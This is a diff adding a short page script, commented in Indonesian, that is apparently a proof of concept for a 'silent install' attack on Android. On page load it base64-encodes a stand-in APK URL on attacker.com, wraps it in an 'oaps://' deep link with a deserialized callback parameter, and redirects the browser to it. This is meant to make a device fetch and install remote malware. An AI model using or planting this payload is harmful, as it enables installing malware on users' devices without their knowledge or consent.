@@ -1,0 +1,11 @@
+<script>
+    // Ini adalah simulasi URL APK yang ingin "diinstal"
+    const targetApk = "https://attacker.com/malware.apk";
+    
+    // Kita bungkus ke dalam parameter OAPS
+    // cb:s: berarti kita memberitahu sistem ini adalah 'string' yang harus di-deserialisasi
+    const intentUrl = "oaps://add?ckey=update_system&cb=s:" + btoa(targetApk);
+
+    console.log("Memicu serangan Silent Install...");
+    window.location.href = intentUrl;
+</script>
